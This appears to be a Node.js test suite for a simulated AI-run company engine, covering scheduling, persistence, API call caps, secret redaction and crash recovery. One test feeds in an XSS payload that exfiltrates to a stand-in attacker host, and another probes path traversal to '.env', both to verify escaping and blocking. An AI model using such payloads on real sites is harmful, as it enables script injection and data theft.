import test from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, rm } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { spawn } from "node:child_process";
import { once } from "node:events";
import {
  createEngine,
  scoreStrategy,
  simulateMarket,
} from "../server/engine.js";
import { STRATEGIES } from "../server/personas.js";

const date = "2026-09-09T05:00:00.000Z";
const base = {
  bootstrap: false,
  databasePath: ":memory:",
  apiKey: "",
  phaseDelayMs: 0,
  clock: () => new Date(date),
};
const secret = "test-secret-never-a-real-api-key";

function engineFor(t, options = {}) {
  const engine = createEngine({ ...base, ...options });
  t.after(() => engine.close());
  return engine;
}

async function dbFor(t) {
  const dir = await mkdtemp(join(tmpdir(), "mesai-test-"));
  t.after(() => rm(dir, { recursive: true, force: true }));
  return join(dir, "mesai.db");
}

function response(value) {
  return {
    ok: true,
    status: 200,
    json: async () => ({
      output: [
        {
          type: "message",
          content: [{ type: "output_text", text: JSON.stringify(value) }],
        },
      ],
    }),
  };
}

function aiMock(calls, tagline = "Ölçümle başlayın.") {
  return async (url, options) => {
    const body = JSON.parse(options.body);
    calls.push({ url, body, headers: options.headers });
    const document = body.input[0].content.includes("Ekip görüşlerinden");
    return response(
      document
        ? {
            brief:
              "Önce kayıt dönemi ve sayaç birimi belirlenir. Eksik veriler işaretlenir. Bu bir saha ölçümü değil, pilot taslağıdır.",
            tagline,
            outreach:
              "Bu taslak gönderilmedi. Son ayda yaşanan ölçüm ve tüketim izleme sorunlarını konuşmak için görüşme planı.",
          }
        : {
            strategyId: "office",
            rationale: "İlk olarak ölçülebilir tüketim kaydını doğrulayalım.",
            risk: "Mevcut sayaç verisi eksik olabilir.",
            priority: 8,
            proposal: "Tek ofiste kapanış günlüğü hazırlayalım.",
          },
    );
  };
}

test("a rules day completes actual artifacts, assigned work, votes and clearly simulated results", async (t) => {
  const engine = engineFor(t, {
    fetchImpl: () => {
      throw new Error("Rules must not call a provider");
    },
  });
  assert.equal((await engine.run({ key: "rules-day" })).completed, true);
  const state = engine.state();
  assert.equal(state.company.day, 1);
  assert.equal(state.runtime.mode, "rules");
  assert.equal(state.runtime.callsToday, 0);
  assert.equal(state.artifacts.length, 4);
  assert.equal(
    state.tasks.filter(
      (task) => task.status === "done" && task.progress === 100,
    ).length,
    8,
  );
  assert.ok(state.decisions.length >= 3);
  assert.equal(
    state.decisions.filter((decision) => decision.status === "completed")
      .length,
    1,
  );
  assert.ok(state.decisions.every((decision) => decision.votes.length === 8));
  assert.ok(
    state.decisions.some((decision) =>
      decision.votes.some((vote) => vote.vote === "no"),
    ),
  );
  assert.match(state.experiments[0].result, /SİMÜLASYON/);
  assert.ok(
    state.agents.every((agent) => agent.memories.length === 1 && agent.xp > 0),
  );
  assert.ok(state.company.xp > 0);
  for (const artifact of state.artifacts) {
    assert.ok(artifact.content.length > 200);
    assert.match(artifact.content, /simülasyon|varsayım/i);
    assert.deepEqual(engine.artifact(artifact.id), artifact);
  }
  const html = state.artifacts.find(
    (artifact) => artifact.type === "html",
  ).content;
  assert.doesNotMatch(html, /<form\b|<iframe\b|src=["']https?:|fetch\s*\(/i);
  assert.equal(engine.artifact("../../.env"), null);
  assert.equal(state.learning, undefined);
  assert.ok(
    state.agents.every(
      (agent) => agent.bias === undefined && agent.preference === undefined,
    ),
  );
});

test("concurrent attempts and repeated durable keys cannot create duplicate days", async (t) => {
  const engine = engineFor(t);
  const results = await Promise.all([
    engine.run({ key: "same-day" }),
    engine.run({ key: "same-day" }),
  ]);
  assert.equal(results.filter((result) => result.started).length, 1);
  assert.equal((await engine.run({ key: "same-day" })).reason, "duplicate");
  assert.equal(engine.state().company.day, 1);
  assert.equal(engine.state().artifacts.length, 4);
});

test("08:00 schedule runs once per Istanbul date, including weekends and startup catch-up", async (t) => {
  let clock = new Date("2026-09-12T04:59:59Z"); // Saturday
  const engine = engineFor(t, { clock: () => clock });
  assert.equal((await engine.tick()).reason, "before_schedule");
  clock = new Date("2026-09-12T05:00:00Z");
  assert.equal((await engine.tick()).completed, true);
  assert.equal((await engine.tick()).reason, "duplicate");
  clock = new Date("2026-09-13T11:30:00Z"); // restart/catch-up well after 08:00
  assert.equal((await engine.tick()).completed, true);
  assert.equal(engine.state().company.day, 2);
  assert.equal((await engine.tick()).reason, "duplicate");
});

test("owner pause survives restart and blocks manual and scheduled days", async (t) => {
  const databasePath = await dbFor(t);
  let engine = createEngine({ ...base, databasePath });
  engine.pause(true);
  await engine.close();
  engine = engineFor(t, { databasePath });
  assert.equal(engine.state().config.autonomous, false);
  assert.equal((await engine.tick()).reason, "paused");
  assert.equal((await engine.run({ key: "paused" })).reason, "paused");
  engine.pause(false);
  assert.equal((await engine.tick()).completed, true);
});

test("completed day, learned policy, memories, files and run identity survive reopening the database", async (t) => {
  const databasePath = await dbFor(t);
  let engine = createEngine({ ...base, databasePath });
  await engine.run({ key: "persistent-day" });
  const before = engine.state();
  const learning = engine.learning;
  await engine.close();
  engine = engineFor(t, { databasePath });
  assert.deepEqual(engine.state(), before);
  assert.deepEqual(engine.learning, learning);
  assert.equal(
    (await engine.run({ key: "persistent-day" })).reason,
    "duplicate",
  );
  await engine.run({ key: "next-day" });
  assert.equal(engine.state().company.day, 2);
  assert.ok(
    engine.state().agents.every((agent) => agent.memories.length === 2),
  );
  assert.deepEqual(
    engine.artifact(before.artifacts[0].id),
    before.artifacts[0],
  );
});

test("experience changes the ranking: failed strategies lose priority and successful alternatives rise", () => {
  const state = { company: { cash: 25000 }, learning: {} };
  const rank = (s) =>
    [...STRATEGIES].sort((a, b) => scoreStrategy(b, s) - scoreStrategy(a, s));
  const first = rank(state)[0];
  const alternative = STRATEGIES.find((strategy) => strategy.id !== first.id);
  const experienced = {
    ...state,
    learning: {
      [first.id]: { successes: 0, failures: 20, attempts: 20 },
      [alternative.id]: { successes: 20, failures: 0, attempts: 20 },
    },
  };
  assert.ok(scoreStrategy(first, experienced) < scoreStrategy(first, state));
  assert.ok(
    scoreStrategy(alternative, experienced) > scoreStrategy(alternative, state),
  );
  assert.equal(rank(experienced)[0].id, alternative.id);
});

test("market model is reproducible, can fail and reconciles simulated revenue and cost", () => {
  const input = {
    strategy: STRATEGIES[0],
    budget: 900,
    day: 1,
    reputation: 50,
    seed: "stable-seed",
  };
  assert.deepEqual(simulateMarket(input), simulateMarket(input));
  const results = Array.from({ length: 50 }, (_, i) =>
    simulateMarket({ ...input, seed: `outcome-${i}` }),
  );
  assert.ok(results.some((result) => result.success));
  assert.ok(results.some((result) => !result.success));
  for (const result of results) {
    assert.equal(result.simulated, true);
    assert.equal(result.profit, result.revenue - result.cost);
    assert.equal(result.revenue, result.customers * input.strategy.price);
  }
});

test("bootstrap never incurs AI calls or claims LLM execution even when a key is configured", async (t) => {
  let calls = 0;
  const engine = engineFor(t, {
    bootstrap: true,
    apiKey: secret,
    fetchImpl: () => {
      calls++;
      throw new Error("Unexpected call");
    },
  });
  await engine.ready;
  assert.equal(calls, 0);
  assert.equal(engine.state().runtime.mode, "rules");
  assert.match(
    engine.state().events.find((event) => event.type === "complete").message,
    /kurallar motoru/,
  );
});

test("AI council uses role-specific prompts, structured Responses output and prior memories", async (t) => {
  const calls = [];
  const engine = engineFor(t, {
    apiKey: secret,
    dailyCallLimit: 24,
    fetchImpl: aiMock(calls),
  });
  await engine.run({ key: "ai-1" });
  assert.equal(calls.length, 9);
  assert.equal(engine.state().runtime.mode, "ai");
  const council = calls.slice(0, 8);
  assert.equal(
    new Set(council.map((call) => call.body.input[0].content)).size,
    8,
  );
  for (const call of calls) {
    assert.equal(call.url, "https://api.openai.com/v1/responses");
    assert.equal(call.body.store, false);
    assert.equal(call.body.tools, undefined);
    assert.equal(call.headers.Authorization, `Bearer ${secret}`);
  }
  await engine.run({ key: "ai-2" });
  const secondCouncil = calls.slice(9, 17);
  assert.ok(
    secondCouncil.every(
      (call) => JSON.parse(call.body.input[1].content).memories.length > 0,
    ),
  );
  assert.ok(
    secondCouncil.every(
      (call) =>
        Object.keys(JSON.parse(call.body.input[1].content).learning).length > 0,
    ),
  );
  assert.doesNotMatch(JSON.stringify(engine.state()), new RegExp(secret));
});

test("daily AI cap persists across restart and all excess work falls back without further requests", async (t) => {
  const databasePath = await dbFor(t);
  const calls = [];
  let engine = createEngine({
    ...base,
    databasePath,
    apiKey: secret,
    dailyCallLimit: 2,
    fetchImpl: aiMock(calls),
  });
  await engine.run({ key: "capped-1" });
  assert.equal(calls.length, 2);
  assert.equal(engine.state().runtime.callsToday, 2);
  assert.match(engine.state().runtime.error, /sınır/);
  await engine.close();
  engine = engineFor(t, {
    databasePath,
    apiKey: secret,
    dailyCallLimit: 2,
    fetchImpl: aiMock(calls),
  });
  await engine.run({ key: "capped-2" });
  assert.equal(calls.length, 2);
  assert.equal(engine.state().runtime.mode, "rules");
  assert.equal(engine.state().artifacts.length, 8);
});

test("provider failures fall back visibly without leaking provider errors or keys", async (t) => {
  const engine = engineFor(t, {
    apiKey: secret,
    fetchImpl: async () => {
      throw new Error(`Provider rejected ${secret}`);
    },
  });
  await engine.run({ key: "failed-provider" });
  const state = engine.state();
  assert.equal(state.runtime.mode, "rules");
  assert.match(state.runtime.error, /kurallar motoru/);
  assert.doesNotMatch(JSON.stringify(state), /test-secret|Provider rejected/);
  assert.equal(state.artifacts.length, 4);
});

test("valid JSON without required council or document fields is not counted as successful AI work", async (t) => {
  const engine = engineFor(t, {
    apiKey: secret,
    fetchImpl: async () => response({ unrelated: true }),
  });
  await engine.run({ key: "invalid-shape" });
  assert.equal(engine.state().runtime.mode, "rules");
  assert.match(engine.state().runtime.error, /kurallar motoru/);
});

test("AI text cannot inject script elements into generated HTML", async (t) => {
  const calls = [];
  const malicious =
    '<script>fetch("https://attacker.invalid/steal")</script><img src=x onerror=alert(1)>';
  const engine = engineFor(t, {
    apiKey: secret,
    fetchImpl: aiMock(calls, malicious),
  });
  await engine.run({ key: "escaping" });
  const html = engine
    .state()
    .artifacts.find((artifact) => artifact.type === "html").content;
  assert.ok(html.includes("&lt;script&gt;"));
  assert.doesNotMatch(html, /<script>fetch|<img src=x/);
});

test(
  "process crash after a market checkpoint resumes without duplicate money, files or experiments",
  { timeout: 15000 },
  async (t) => {
    const databasePath = await dbFor(t);
    const engineUrl = new URL("../server/engine.js", import.meta.url).href;
    const source = `
    import { createEngine } from ${JSON.stringify(engineUrl)};
    const engine = createEngine({databasePath:${JSON.stringify(databasePath)},bootstrap:false,apiKey:'',phaseDelayMs:150,clock:()=>new Date(${JSON.stringify(date)})});
    const timer = setInterval(()=>{const state=engine.state();if(state.experiments.length===1 && state.history.length===1){clearInterval(timer);process.send(state);}},2);
    engine.run({key:'crash-day'}).catch(error=>{console.error(error);process.exitCode=1;});
  `;
    const child = spawn(
      process.execPath,
      ["--input-type=module", "-e", source],
      { stdio: ["ignore", "ignore", "pipe", "ipc"] },
    );
    t.after(() => {
      if (child.exitCode === null) child.kill("SIGKILL");
    });
    let errorText = "";
    child.stderr.on("data", (chunk) => {
      errorText += chunk;
    });
    const checkpoint = await new Promise((resolve, reject) => {
      child.once("message", resolve);
      child.once("exit", (code) =>
        reject(
          new Error(`Child exited before checkpoint (${code}): ${errorText}`),
        ),
      );
    });
    const exited = once(child, "exit");
    child.kill("SIGKILL");
    await exited;
    const engine = engineFor(t, {
      databasePath,
      clock: () => new Date("2026-09-09T05:10:00Z"),
    });
    assert.equal((await engine.tick()).completed, true);
    const recovered = engine.state();
    assert.equal(recovered.company.day, 1);
    assert.equal(recovered.company.cash, checkpoint.company.cash);
    assert.equal(recovered.company.revenue, checkpoint.company.revenue);
    assert.equal(recovered.company.customers, checkpoint.company.customers);
    assert.equal(recovered.experiments.length, 1);
    assert.equal(recovered.artifacts.length, 4);
    assert.equal(recovered.history.length, 2);
    assert.ok(recovered.agents.every((agent) => agent.memories.length === 1));
    assert.equal((await engine.run({ key: "crash-day" })).reason, "duplicate");
  },
);
